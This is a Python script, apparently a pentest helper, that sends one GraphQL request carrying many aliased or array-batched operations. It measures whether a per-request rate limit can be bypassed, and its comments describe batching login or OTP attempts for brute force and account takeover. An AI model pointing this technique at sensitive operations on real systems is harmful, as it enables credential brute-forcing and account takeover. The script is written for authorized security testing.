#!/usr/bin/env python3
"""
batch_ratelimit_test.py — measure a GraphQL batching rate-limit bypass (benign proof, no real brute).

GraphQL aliases (and JSON-array batching) let one HTTP request carry many operations. If the server
rate-limits per HTTP request, batching bypasses it (guide §9). This helper sends ONE request with N
aliased operations and reports how many were processed/aliased back — the proof that the per-request
limit is bypassable — WITHOUT brute-forcing a real user's credentials/OTP.

By default it batches a harmless query (__typename) N times to prove the engine processes N ops in one
request. To demonstrate the security impact, point --op at a sensitive operation on YOUR OWN account
(e.g. a benign 'login' attempt with your own dummy creds) and observe N attempts processed in one request.

Authorized testing only. Do NOT brute real users. The point is the MEASURED bypass count, not the brute.
"""
import argparse, json, sys
try:
    import requests
except ImportError:
    sys.exit("pip install requests")


def build_alias_query(op_template, n):
    """op_template uses {i} for the alias index; default is a harmless __typename probe."""
    parts = []
    for i in range(n):
        parts.append(f"a{i}: " + op_template.format(i=i))
    return "{ " + " ".join(parts) + " }"


def build_array_batch(op_template, n):
    return [{"query": "{ " + op_template.format(i=i) + " }"} for i in range(n)]


def main():
    p = argparse.ArgumentParser(description="GraphQL batching rate-limit-bypass measurement (authorized only).")
    p.add_argument("--url", required=True)
    p.add_argument("--token", help="your account bearer token")
    p.add_argument("--count", type=int, default=20, help="ops per single request (default 20)")
    p.add_argument("--mode", choices=["alias", "array"], default="alias")
    p.add_argument("--op", default="__typename",
                   help="operation template (use {i} for index). Default harmless __typename. "
                        "For a real demo use a sensitive op on YOUR OWN account.")
    args = p.parse_args()

    if args.count > 200:
        sys.exit("Refusing count > 200 — a measured bypass needs a reasonable number, not a flood (guide §24).")

    headers = {"Content-Type": "application/json"}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"

    if args.mode == "alias":
        payload = {"query": build_alias_query(args.op, args.count)}
    else:
        payload = build_array_batch(args.op, args.count)

    print(f"== sending ONE request with {args.count} operations (mode={args.mode}) ==")
    try:
        r = requests.post(args.url, headers=headers, data=json.dumps(payload), timeout=30)
    except Exception as e:
        sys.exit(f"request failed: {e}")

    print(f"HTTP {r.status_code}; response bytes: {len(r.content)}")
    try:
        body = r.json()
    except ValueError:
        print("non-JSON response (truncated):", r.text[:300]); return

    processed = 0
    if args.mode == "alias":
        d = body.get("data") or {}
        processed = sum(1 for k in d if k.startswith("a"))
    else:
        processed = len(body) if isinstance(body, list) else 0

    print(f"operations processed in ONE request: {processed} / {args.count}")
    if processed > 1:
        print("→ The server processed MULTIPLE operations in a single HTTP request.")
        print("  IF a per-HTTP-request rate limit exists on this operation, it is BYPASSED by batching")
        print("  (guide §9). To show the security impact, batch a sensitive op (login/otp) on YOUR OWN")
        print("  account and show N attempts processed where the per-request limit is 1/5 → brute → ATO.")
    else:
        print("→ Only one operation processed — batching may be disabled/capped (good defense).")


if __name__ == "__main__":
    main()
